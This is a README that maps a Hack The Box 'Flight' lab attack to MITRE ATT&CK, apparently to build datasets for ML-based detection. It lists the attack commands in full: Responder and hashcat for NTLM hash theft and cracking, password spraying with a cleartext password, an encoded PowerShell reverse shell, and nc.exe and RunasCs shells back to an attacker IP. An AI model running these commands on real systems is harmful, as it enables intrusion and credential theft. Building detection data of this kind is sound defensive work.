# Cyber4ML_Framework application in "Flight" HTB machine

## Framework application details

|Documentation|MITRE ATT&CK|Enterprise|ICS|Network Analysis|Log Analysis|
|-|-|-|-|-|-|
|Yes|Yes|Yes|No|Yes|Yes|

|Attacker Level|Environment|VPN|Attacker IP|Victim IP|
|-|-|-|-|-|
|Average|Linux|Yes|10.10.17.4|10.10.11.187|

**Average:** The knowledge, behavior and attack-timing of the attacker is average.

## Documentation

Documentation of the attack: [Flight Documentation](https://github.com/stevendamianakis/HackTheBox_Writeups/blob/main/Machines/Flight/README.MD)

## MITRE ATT&CK mapping

Below, we map the attack to the MITRE ATT&CK Enterprise framework.

| Tactic | Technique | Subtechnique | Command/Script | CVE/CWE |
| - | - | - | - | - |
| Discovery | Network Service Discovery | - | (1) | - |
| Reconnaissance | Active Scanning | Wordlist Scanning | (2) | - |
| Credential Access | OS Credential Dumping | LSASS Memory | (3) | - |
| Credential Access | Brute Force | Password Cracking | (4), (17) | - |
| Discovery | System Owner/User Discovery | - | (5), (12), (18) | - |
| Discovery | Network Share Discovery | - | (6), (8) | - |
| Credential Access | Brute Force | Password Spraying | (7) | - |
| Initial Access | Valid Accounts | Local Accounts | (9) | - |
| Execution | User Execution | Malicious File | (10) | - |
| Initial Access | Exploit Public-Facing Application | - | - | - |
| Execution | Command and Scripting Interpreter | PowerShell | (11) | - |
| Privilege Escalation | Valid Accounts | Local Accounts | - | - |
| Discovery | File and Directory Discovery | - | - | - |
| Discovery | System Network Connections Discovery | - | (13) | - |
| Discovery | Permission Groups Discovery | Local Groups | (14), (18) | - |
| Privilege Escalation | Access Token Manipulation | Create Process with Token | (15) | - |
| Privilege Escalation | Abuse Elevation Control Mechanism | Bypass User Account Control | (16) | - |
| Privilege Escalation | Exploitation for Privilege Escalation | - | - | - |

#### Commands/Scripts
- (1)
```
nmap -sV 10.10.11.187
```

- (2)
```
wfuzz -c -w subdomains-top1million-20000.txt -u "http://10.10.11.187/" -H "Host: FUZZ.flight.htb" --hl 154
```

- (3)
```
python3 Responder.py -I tun0
```

- (4)
```
hashcat -a 0 -m 5600 hash rockyou.txt
```

- (5)
```
crackmapexec smb flight.htb  -u svc_apache -p 'S@Ss!K@*t13'  --users
```

- (6)
```
crackmapexec smb flight.htb  -u svc_apache -p 'S@Ss!K@*t13'  --shares
```

- (7)
```
crackmapexec smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
```

- (8)
```
crackmapexec smb flight.htb  -u s.moon -p 'S@Ss!K@*t13'  --shares
```

- (9)
```
smbclient //flight.htb/shared -U S.moon
```

- (10)
```
python3 ntlm_theft.py -g all -s 10.10.14.7 -f files
```

- (11)
```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

- (12)
```
whoami
```

- (13)
```
netstat -a
```

- (14)
```
icacls *
```

- (15)
```
.\RunasCs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.14.7:4445
```

- (16)
```
.\potatoe.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c C:\Windows\Temp\nc.exe 10.10.14.7 6666 -e cmd.exe"
```

- (17)
```
hashcat -a 0 -m 5600 hash2 rockyou.txt
```

- (18)
```
whoami /all
```

## Network Data

Pcap file of the attack: [Capture File](https://github.com/stevendamianakis/Cyber4ML_Framework/blob/main/HackTheBox/Flight/attack_capture.zip)

## Malicious Log Data
